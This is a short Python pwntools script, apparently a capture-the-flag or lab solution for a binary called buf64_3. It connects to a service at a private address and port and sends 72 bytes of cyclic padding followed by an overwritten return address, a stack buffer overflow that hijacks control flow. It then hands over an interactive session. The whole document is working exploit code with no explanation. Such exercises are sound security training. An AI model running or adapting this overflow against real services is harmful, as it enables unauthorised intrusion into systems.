from pwn import *
context(terminal=['./gdbpwn-client.sh'])
elf = ELF('./buf64_3')
#p = elf.process()
#gdb.attach(p)
#pause()
p = remote('192.168.1.2', 1810)
p.sendlineafter(b'<<', cyclic(72)+p64(0x400707+16))
p.interactive()
